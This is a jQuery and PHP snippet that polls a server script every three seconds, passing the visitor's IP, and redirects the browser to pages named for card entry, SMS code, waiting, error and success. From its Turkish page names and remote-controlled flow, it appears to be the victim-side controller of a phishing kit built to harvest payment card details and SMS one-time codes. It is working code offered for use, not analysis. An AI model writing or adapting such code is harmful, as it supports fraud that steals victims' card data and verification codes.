<script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      if(msg=='1'){
        top.location.href='index.php?1';
      }       	 if(msg=='2'){
        window.location.href='kart.php';
      }					 if(msg=='6'){
        window.location.href='sms.php';
      }          if(msg=='3'){
        window.location.href='bekle.php';
      }          if(msg=='4'){
        window.location.href='hata.php';
      }          if(msg=='5'){
        window.location.href='tebrik.php';
      }          if(msg=='7'){
        window.location.href='ozelsayfa.php';
      }  
      }
    });
    
}
</script>